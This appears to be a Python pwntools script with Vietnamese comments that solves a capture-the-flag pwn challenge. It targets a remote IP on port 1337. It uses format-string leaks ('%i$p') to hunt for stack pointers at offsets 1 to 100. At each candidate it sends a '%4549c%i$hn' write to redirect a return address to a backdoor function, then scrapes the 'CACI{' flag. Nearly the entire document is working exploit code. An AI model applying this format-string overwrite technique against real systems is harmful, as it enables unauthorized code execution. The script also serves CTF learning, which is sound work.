from pwn import *
import time

# Cấu hình
context.log_level = 'critical'
context.arch = 'amd64'

HOST = '18.212.136.134'
PORT = 1337

# Địa chỉ Backdoor: 0x4011c5 (4549)
# Nhảy qua 'push rbp' để tránh crash
BACKDOOR_LOW = 4549

def solve():
    print("="*60)
    print("[*] CHIẾN DỊCH: STACK POINTER HUNTER (OFFSET 1-100)")
    print("[*] Logic: Tìm pointer 0x7f... (Stack) -> Sửa thành 0x4011c5")
    print("="*60)

    for i in range(1, 101):
        try:
            # Bước 1: Leak giá trị tại offset i
            r = remote(HOST, PORT, level='error')
            r.recvuntil(b"say: ")
            
            # Leak đơn lẻ để tránh bị cắt chuỗi
            r.sendline(f"|%{i}$p|".encode())
            
            resp = r.recvline(timeout=1).decode(errors='ignore')
            r.close()
            
            val = ""
            if "|" in resp:
                val = resp.split("|")[1]
            
            # Bước 2: Phân tích
            # Chúng ta chỉ quan tâm đến các con trỏ Stack (bắt đầu bằng 0x7f)
            # Vì chỉ có con trỏ Stack mới trỏ được đến Return Address (nằm trên Stack)
            if val.startswith("0x7f"):
                print(f"[*] Offset {i:02d}: {val} -> STACK PTR DETECTED! BẮN!", end='')
                sys.stdout.flush()
                
                # Bước 3: Tấn công ngay vào Offset này
                r2 = remote(HOST, PORT, level='error')
                r2.recvuntil(b"say: ")
                
                # Payload: In 4549 ký tự, ghi 2 byte thấp vào địa chỉ mà offset i trỏ tới
                payload = f"%{BACKDOOR_LOW}c%{i}$hn".encode()
                
                r2.sendline(payload)
                
                # Đọc flag
                buffer = b""
                start_t = time.time()
                while time.time() - start_t < 2:
                    try:
                        chunk = r2.recv(4096, timeout=0.5)
                        if not chunk: break
                        buffer += chunk
                        if b"CACI{" in buffer:
                            print("\n" + "!"*60)
                            print(f"[!!!] JACKPOT TẠI OFFSET {i} !!!")
                            
                            idx = buffer.find(b"CACI{")
                            end_idx = buffer.find(b"}", idx) + 1
                            flag = buffer[idx:end_idx].decode()
                            
                            print(f"[!!!] FLAG: {flag}")
                            print("!"*60 + "\n")
                            r2.close()
                            return
                    except:
                        break
                r2.close()
                
                if b"CACI" in buffer:
                    print(" -> SUCCESS!")
                    return
                else:
                    print(" -> Trượt.")
            else:
                # Bỏ qua nil, 0x0, 0x40... (Heap/Code pointers không ghi được do RELRO)
                print(f"[*] Offset {i:02d}: {val} (Skip)")

        except KeyboardInterrupt:
            print("\nDừng.")
            break
        except Exception:
            pass

if __name__ == "__main__":
    solve()